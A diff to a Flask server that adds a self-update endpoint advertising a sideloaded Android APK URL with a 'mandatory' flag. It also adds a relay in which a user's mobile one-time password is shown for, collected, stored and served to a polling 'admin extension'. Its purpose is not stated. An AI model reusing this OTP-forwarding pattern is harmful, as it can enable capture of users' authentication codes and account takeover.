@@ -186,7 +186,37 @@ def serve_static(filename):
 
 @app.route('/version')
 def version():
-    return jsonify({"version": "2.6.1", "features": ["scan_fix", "activity_tracking"]})
+    # Android self-update info. The values are set from the Admin panel and stored in Redis;
+    # the defaults below are used only if Redis is unset/unavailable. The app compares its own
+    # installed versionCode against "versionCode" and prompts to update when the server is higher.
+    version_code = 3
+    version_name = "1.2"
+    apk_url = "https://vecnaselfie.com/VecnaClient.apk"
+    mandatory = False
+    try:
+        if redis is not None:
+            vc = redis.get("app_version_code")
+            if vc is not None and str(vc).strip() != "":
+                version_code = int(vc)
+            vn = redis.get("app_version_name")
+            if vn:
+                version_name = str(vn)
+            au = redis.get("app_apk_url")
+            if au:
+                apk_url = str(au)
+            mu = redis.get("app_update_mandatory")
+            if mu is not None:
+                mandatory = str(mu).strip().lower() in ("1", "true", "yes")
+    except Exception:
+        pass
+    return jsonify({
+        "version": "2.6.1",
+        "features": ["scan_fix", "activity_tracking"],
+        "versionCode": version_code,
+        "versionName": version_name,
+        "apkUrl": apk_url,
+        "mandatory": mandatory
+    })
 
 @app.route('/robots.txt')
 def robots():
@@ -500,6 +530,35 @@ def get_ticker_message():
         msg = redis.get("ticker_message")
         return jsonify({"success": True, "message": msg if msg else ""})
     except: return jsonify({"success": False, "message": ""})
+
+@app.route('/api/admin/set_app_version', methods=['POST'])
+def admin_set_app_version():
+    """Set the Android app version advertised by /version (self-update prompt)."""
+    try:
+        data = request.json or {}
+        if data.get('admin_secret') != ADMIN_SECRET_KEY: return jsonify({"success": False}), 401
+
+        try:
+            version_code = int(data.get('version_code'))
+        except (TypeError, ValueError):
+            return jsonify({"success": False, "message": "version_code must be an integer"}), 400
+
+        redis.set("app_version_code", str(version_code))
+
+        version_name = data.get('version_name')
+        if version_name is not None and str(version_name).strip() != "":
+            redis.set("app_version_name", str(version_name).strip())
+
+        apk_url = data.get('apk_url')
+        if apk_url is not None and str(apk_url).strip() != "":
+            redis.set("app_apk_url", str(apk_url).strip())
+
+        mandatory = data.get('mandatory')
+        is_mandatory = mandatory is True or str(mandatory).strip().lower() in ("1", "true", "yes")
+        redis.set("app_update_mandatory", "1" if is_mandatory else "0")
+
+        return jsonify({"success": True, "version_code": version_code, "mandatory": is_mandatory})
+    except Exception as e: return jsonify({"success": False, "message": str(e)}), 500
 
 @app.route('/api/admin/clear_test_device', methods=['POST'])
 def admin_clear_test_device():
@@ -1026,6 +1085,7 @@ def submit_mobile_otp():
             s = json.loads(s_str)
             clean_otp = str(otp).strip()
             s['mobile_otp'] = clean_otp
+            s['otp_requested'] = False
             if ev_id and not s.get('event_session_id'):
                 s['event_session_id'] = ev_id
             redis.set(sid, json.dumps(s), ex=86400)
@@ -1065,10 +1125,45 @@ def check_session_status():
             "success": True, "data": {
                 "status": s.get('status'),
                 "event_session_id": s.get('event_session_id'),
-                "mobile_otp": otp
+                "mobile_otp": otp,
+                "otp_requested": bool(s.get('otp_requested', False))
             }
         }).encode('utf-8')).decode('utf-8')
     except Exception as e: return jsonify({"success": False, "message": str(e)}), 500
+
+@app.route('/api/request_mobile_otp', methods=['POST', 'GET'])
+@app.route('/api/request_mobile_otp.php', methods=['POST', 'GET'])
+def request_mobile_otp():
+    """Called by the admin extension when it starts waiting for the mobile OTP.
+    Sets otp_requested=True on the session so the Android app shows its OTP field.
+    Pass clear=1 to unset (e.g. once the OTP has been consumed)."""
+    try:
+        try: raw = request.data.decode('utf-8'); payload = json.loads(base64.b64decode(raw).decode('utf-8'))
+        except: payload = request.json or request.args or {}
+        sid = payload.get('session_id')
+        ev_id = payload.get('event_session_id')
+        clear = str(payload.get('clear', '')).strip().lower() in ('1', 'true', 'yes')
+        if not sid and not ev_id:
+            return jsonify({"success": False, "message": "Missing session_id or event_session_id"}), 400
+
+        s_str = redis.get(sid) if sid else None
+        if not s_str:
+            for key in [sid, ev_id]:
+                if not key: continue
+                alt = redis.get(f"event_sid:{key}")
+                if alt:
+                    sid = alt.decode('utf-8') if isinstance(alt, bytes) else alt
+                    s_str = redis.get(sid)
+                    if s_str: break
+        if not s_str:
+            return jsonify({"success": False, "message": "Session not found"}), 404
+
+        s = json.loads(s_str)
+        s['otp_requested'] = (not clear)
+        redis.set(sid, json.dumps(s), ex=86400)
+        return jsonify({"success": True, "otp_requested": (not clear)})
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)}), 500
 
 @app.route('/api/get_mobile_otp', methods=['POST', 'GET'])
 @app.route('/api/get_mobile_otp.php', methods=['POST', 'GET'])
@@ -1093,11 +1188,13 @@ def get_mobile_otp():
             return jsonify({"success": True, "mobile_otp": clean.strip()})
 
         # 2. Check session key in Redis
+        resolved_sid = sid
         s_str = redis.get(sid)
         if not s_str:
             alt_sid = redis.get(f"event_sid:{sid}")
             if alt_sid:
                 sid_str = alt_sid.decode('utf-8') if isinstance(alt_sid, bytes) else str(alt_sid)
+                resolved_sid = sid_str
                 s_str = redis.get(sid_str)
         
         if s_str:
@@ -1109,6 +1206,13 @@ def get_mobile_otp():
                     otp = ev2.decode('utf-8') if isinstance(ev2, bytes) else str(ev2)
             if otp:
                 return jsonify({"success": True, "mobile_otp": str(otp).strip()})
+            # No OTP yet: the admin extension polling get_mobile_otp means it is WAITING for the
+            # client's OTP. Auto-flag the session so the Android app shows its OTP input field.
+            # This makes the flow work even if the extension was never updated to signal explicitly.
+            if not s.get('otp_requested'):
+                s['otp_requested'] = True
+                try: redis.set(resolved_sid, json.dumps(s), ex=86400)
+                except Exception: pass
         
         return jsonify({"success": False, "message": "OTP not found yet"}), 404
     except Exception as e:
